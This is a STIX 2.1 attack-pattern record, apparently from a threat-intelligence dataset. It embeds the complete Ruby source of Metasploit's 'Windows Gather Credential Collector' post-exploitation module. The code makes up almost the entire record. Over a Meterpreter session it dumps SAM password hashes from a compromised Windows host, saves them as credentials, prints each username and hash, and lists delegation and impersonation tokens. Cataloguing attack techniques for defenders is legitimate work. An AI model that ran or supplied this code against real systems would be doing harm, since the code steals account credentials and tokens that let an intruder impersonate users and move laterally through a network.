{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21cd4446-da40-486c-94f8-f4f07a6becab",
    "created": "2024-08-14T16:33:08.756812Z",
    "modified": "2024-08-14T16:33:08.756816Z",
    "name": "Windows Gather Credential Collector",
    "description": "This module harvests credentials found on the host and stores them in the database. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/credential_collector.rb",
            "external_id": "credential_collector.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Credential Collector',\n        'Description' => %q{ This module harvests credentials found on the host and stores them in the database.},\n        'License' => MSF_LICENSE,\n        'Author' => [ 'tebo[at]attackresearch.com'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              incognito_list_tokens\n              priv_passwd_get_sam_hashes\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    # Collect even without a database to store them.\n    if session.framework.db.active\n      db_ok = true\n    else\n      db_ok = false\n    end\n\n    # Make sure we're rockin Priv and Incognito\n    session.core.use('priv') if !session.priv\n    session.core.use('incognito') if !session.incognito\n\n    # It wasn't me mom! Stinko did it!\n    begin\n      hashes = client.priv.sam_hashes\n    rescue StandardError\n      print_error('Error accessing hashes, did you migrate to a process that matched the target\\'s architecture?')\n      return\n    end\n\n    # Target infos for the db record\n    addr = session.session_host\n    # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)\n\n    # Record hashes to the running db instance\n    print_good 'Collecting hashes...'\n\n    hashes.each do |hash|\n      # Build service information\n      service_data = {\n        address: addr,\n        port: 445,\n        service_name: 'smb',\n        protocol: 'tcp'\n      }\n\n      # Build credential information\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :ntlm_hash,\n        private_data: hash.lanman + ':' + hash.ntlm,\n        username: hash.user_name,\n        workspace_id: myworkspace_id\n      }\n\n      credential_data.merge!(service_data)\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        workspace_id: myworkspace_id\n      }\n\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n\n      print_line \"    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}\"\n    end\n\n    # Record user tokens\n    tokens = session.incognito.incognito_list_tokens(0)\n    raise Rex::Script::Completed if !tokens\n\n    # Meh, tokens come to us as a formatted string\n    print_good 'Collecting tokens...'\n    (tokens['delegation'] + tokens['impersonation']).split(\"\\n\").each do |token|\n      data = {}\n      data[:host] = addr\n      data[:type] = 'smb_token'\n      data[:data] = token\n      data[:update] = :unique_data\n\n      print_line \"    #{data[:data]}\"\n      report_note(data) if db_ok\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}